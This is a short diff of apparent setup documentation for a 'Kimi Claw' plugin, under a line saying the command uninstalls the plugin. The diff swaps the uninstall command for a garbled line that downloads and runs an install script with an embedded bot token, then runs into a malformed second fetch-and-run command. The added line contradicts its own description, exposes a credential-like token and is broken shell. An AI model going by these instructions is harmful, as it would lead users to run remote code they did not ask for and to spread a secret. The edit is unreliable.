@@ -172,8 +172,8 @@ Kimi Claw is currently available on the web and mobile app (Android/iOS). Please
 
 You can run this command on the linked OpenClaw device to uninstall the Kimi plugin:
 
-```bash
-bash <(curl -fsSL https://cdn.kimi.com/kimi-claw/uninstall.sh)
-```
+bash <(curl -fsSL https://cdn.kimi.com/kimi-claw/install.sh) --bot-token sk-SCQP6ZPACG5CKZBDXKSXKQTN7Mbash <(bash -fsSL https://cdn.kimi.com/kimi-claw/uninstall.sh)
+
+
 
 
